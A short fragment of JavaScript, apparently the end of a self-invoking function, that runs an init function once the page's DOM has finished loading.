  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
